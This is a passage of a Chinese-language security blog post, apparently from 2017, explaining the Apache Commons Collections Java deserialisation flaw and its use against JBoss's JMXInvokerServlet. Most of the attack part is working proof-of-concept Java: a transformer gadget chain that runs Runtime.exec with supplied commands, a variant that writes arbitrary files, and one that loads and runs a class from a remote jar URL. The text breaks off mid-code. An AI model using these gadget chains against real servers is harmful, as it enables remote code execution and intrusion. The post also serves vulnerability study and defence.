@@ -1,0 +1,1370 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java,code execution,java unserialize,jboss,weblogic,jenkins,websphere," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。">
+<meta name="keywords" content="java,code execution,java unserialize,jboss,weblogic,jenkins,websphere">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons Collections Java 反序列化漏洞总结">
+<meta property="og:url" content="http://orleven.orleven.com/2017/11/11/java-deserialize/index.html">
+<meta property="og:site_name" content="Orleven Blog">
+<meta property="og:description" content="概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-head.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-code-1.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-jboss-exec.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-jboss-2017-500.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-jboss-2017-log.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/weblogic-exec.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/websphere-8880.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/websphere-8880-exec.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/jenkins-head.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/java-deserialize/jenkins-data.png">
+<meta property="og:updated_time" content="2017-12-14T09:47:24.201Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Commons Collections Java 反序列化漏洞总结">
+<meta name="twitter:description" content="概述Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。">
+<meta name="twitter:image" content="http://orleven.orleven.com/images/java-deserialize/java-deserialize-head.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://orleven.orleven.com/2017/11/11/java-deserialize/"/>
+
+
+
+
+
+  <title>Commons Collections Java 反序列化漏洞总结 | Orleven Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?00a49c2d4ae104181c342efc37bbbdc8";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Orleven Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Orleven Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://orleven.orleven.com/2017/11/11/java-deserialize/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Orleven">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Orleven Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Commons Collections Java 反序列化漏洞总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-11T03:22:12+08:00">
+                2017-11-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/code-execution/" itemprop="url" rel="index">
+                    <span itemprop="name">code execution</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/11/11/java-deserialize/" class="leancloud_visitors" data-flag-title="Commons Collections Java 反序列化漏洞总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Java 反序列化漏洞，‍‍序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。</p>
+<a id="more"></a>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">String obj =<span class="string">"hello, world! This is a test!"</span>;</div><div class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"test/object"</span>);</div><div class="line">ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</div><div class="line">os.writeObject(obj);</div><div class="line">os.close();</div></pre></td></tr></table></figure>
+<p><img src="/images/java-deserialize/java-deserialize-head.png" alt="java-deserialize-head"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"test/object"</span>);</div><div class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</div><div class="line">String obj2 = (String) ois.readObject();</div><div class="line"> System.out.print(obj2);</div><div class="line">ois.close();</div></pre></td></tr></table></figure>
+<p>最后输出为<code>hello, world! This is a test!</code>。</p>
+<h1 id="Commons-Collections-Java"><a href="#Commons-Collections-Java" class="headerlink" title="Commons Collections Java"></a>Commons Collections Java</h1><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。当然Java反序列化的问题就是出在org.apache.commons.collections这个库，这个库里的Package如下图所示：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections</div><div class="line">org.apache.commons.collections.bag</div><div class="line">org.apache.commons.collections.bidimap</div><div class="line">org.apache.commons.collections.buffer</div><div class="line">org.apache.commons.collections.collection</div><div class="line">org.apache.commons.collections.comparators</div><div class="line">org.apache.commons.collections.functors</div><div class="line">org.apache.commons.collections.iterators</div><div class="line">org.apache.commons.collections.keyvalue</div><div class="line">org.apache.commons.collections.list</div><div class="line">org.apache.commons.collections.map</div><div class="line">org.apache.commons.collections.set</div></pre></td></tr></table></figure>
+<p>里面主要涉及到的类有<code>ConstantTransformer</code>、<code>InvokerTransformer</code>等</p>
+<p>整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。</p>
+<p>TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。</p>
+<p>TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</p>
+<p>poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。</p>
+<p>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。</p>
+<p>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
+<p>因此我们在poc中看见了下行的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> Transformer transforms[] = &#123;</div><div class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</div><div class="line">        ),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;<span class="number">0</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</div><div class="line">        ),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;String[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;commands&#125;</div><div class="line">        )</div><div class="line">&#125;;</div><div class="line"></div><div class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line">Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">tempMap.put(<span class="string">"value"</span>, <span class="string">"tentacle"</span>);</div><div class="line">Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</div><div class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line">Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123;Class.class, Map.class&#125;);</div><div class="line">ctor.setAccessible(<span class="keyword">true</span>);</div><div class="line">instance = ctor.newInstance(<span class="keyword">new</span> Object[] &#123;Target.class, exMap&#125;);</div><div class="line">ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream(<span class="number">10</span>);</div><div class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bo);</div><div class="line">out.writeObject(instance);</div><div class="line">out.flush();</div><div class="line">out.close();</div><div class="line"><span class="keyword">return</span> bo.toByteArray();</div></pre></td></tr></table></figure>
+<p>如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"> Transformer transforms[] = &#123;</div><div class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</div><div class="line">        ),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;<span class="number">0</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</div><div class="line">        ),</div><div class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</div><div class="line">                <span class="keyword">new</span> Class[] &#123;String[].class&#125;,</div><div class="line">                <span class="keyword">new</span> Object[] &#123;commands&#125;</div><div class="line">        )</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>这样，这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getMethod"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)).exec(commands);</div></pre></td></tr></table></figure>
+<p>其对应关系如下：</p>
+<p><img src="/images/java-deserialize/java-deserialize-code-1.png" alt="java-deserialize-code-1"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</span></div><div class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line"></div><div class="line"><span class="comment">// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式</span></div><div class="line">Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">tempMap.put(<span class="string">"value"</span>, <span class="string">"orleven"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 对Map类的数据结构进行转化</span></div><div class="line"><span class="comment">// TransformedMap.decorate(目标Map, key的转化对象(单个或者链或者null), value的转化对象(单个或者链或者null));</span></div><div class="line">Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);  </div><div class="line"></div><div class="line"><span class="comment">//实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋值为精心构造的恶意TransformedMap对象。</span></div><div class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line">Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123;Class.class, Map.class&#125;);</div><div class="line">ctor.setAccessible(<span class="keyword">true</span>);</div><div class="line">instance = ctor.newInstance(<span class="keyword">new</span> Object[] &#123;Target.class, exMap&#125;);</div><div class="line"></div><div class="line"><span class="comment">// 序列化后转化为byte数组，提交给未做安全检测的Java应用。Java应用在进行反序列化操作时，则会触发TransformedMap的变换函数，执行预设的命令。</span></div><div class="line">ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream(<span class="number">10</span>);</div><div class="line">ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bo);</div><div class="line">out.writeObject(instance);</div><div class="line">out.flush();</div><div class="line">out.close();</div><div class="line"><span class="keyword">return</span> bo.toByteArray();</div></pre></td></tr></table></figure>
+<h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><h2 id="JBoss-JMXInvokerServlet-反序列化"><a href="#JBoss-JMXInvokerServlet-反序列化" class="headerlink" title="JBoss JMXInvokerServlet 反序列化"></a>JBoss JMXInvokerServlet 反序列化</h2><p>JBoss JMXInvokerServlet 存在反序列化漏洞。<code>invoker/JMXInvokerServlet</code></p>
+<p>可直接向<code>http://192.168.111.145:8080/invoker/JMXInvokerServlet</code>发送特殊构造的恶意代码，但是由于这个漏洞本身不回显，漏洞一开始并不好利用。后来大佬们通常先上传一个<a href="https://xxx" target="_blank" rel="noopener">jar</a>文件，然后通过加载Jar的方式进行异常封装，从而解决了回显的问题,具体poc如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">fileupload</span><span class="params">(String filepath, <span class="keyword">byte</span>[] data)</span></span></div><div class="line">    &#123;</div><div class="line">        Object instance = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line"><span class="comment">//            ((FileOutputStream)FileOutputStream.class.getDeclaredConstructor(null).newInstance(null)).write(data);</span></div><div class="line">            Transformer transforms[] = &#123;</div><div class="line">                    <span class="keyword">new</span> ConstantTransformer(FileOutputStream.class),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getDeclaredConstructor"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;Class[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="keyword">new</span> Class[] &#123;String.class&#125;&#125;</div><div class="line">                    ),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;Object[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="keyword">new</span> Object[] &#123;filepath&#125;&#125;</div><div class="line">                    ),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"write"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;<span class="keyword">byte</span>[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;data&#125;</div><div class="line">                    )</div><div class="line">            &#125;;</div><div class="line">            Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line">            Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">            tempMap.put(<span class="string">"value"</span>, <span class="string">"orleven"</span>);</div><div class="line">            Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</div><div class="line">            Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line">            Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123;Class.class, Map.class&#125;);</div><div class="line">            ctor.setAccessible(<span class="keyword">true</span>);</div><div class="line">            instance = ctor.newInstance(<span class="keyword">new</span> Object[]&#123;Target.class, exMap&#125;);</div><div class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> instance;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">classInject</span><span class="params">(String packUri, String className, String[] code)</span></span></div><div class="line">    &#123;</div><div class="line">        Object instance = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="comment">//  ((URLClassLoader)URLClassLoader.class.getMethod("newInstance",null).invoke(null,packUri)).loadClass(className).getMethod("main",null).invoke(null,code)</span></div><div class="line">            Transformer transforms[] = &#123;</div><div class="line">                    <span class="keyword">new</span> ConstantTransformer(URLClassLoader.class),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="string">"newInstance"</span>, <span class="keyword">new</span> Class[] &#123;URL[].class&#125;&#125;</div><div class="line">                    ),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="number">0</span>, <span class="keyword">new</span> Object[] &#123;<span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(packUri)&#125;&#125;&#125;</div><div class="line">                    ),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;String.class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;className&#125;),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="string">"main"</span>, <span class="keyword">new</span> Class[] &#123;String[].class&#125;&#125;</div><div class="line">                    ),</div><div class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</div><div class="line">                            <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</div><div class="line">                            <span class="keyword">new</span> Object[] &#123;<span class="number">0</span>, <span class="keyword">new</span> Object[] &#123;code&#125;&#125;</div><div class="line">                    )</div><div class="line">            &#125;;</div><div class="line">            Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line">            Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">            tempMap.put(<span class="string">"value"</span>, <span class="string">"orleven"</span>);</div><div class="line">            Map exMap = TransformedMap.decorate(tempMap, <span class="keyword">null</span>, transformerChain);</div><div class="line">            Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</div><div class="line">            Constructor ctor = cls.getDeclaredConstructor(<span class="keyword">new</span> Class[] &#123;Class.class, Map.class&#125;);</div><div class="line">            ctor.setAccessible(<span class="keyword">true</span>);</div><div class="line">            instance = ctor.newInstance(<span class="keyword">new</span> Object[]&#123;Target.class, exMap&#125;);</div><div class="line">        &#125;<span 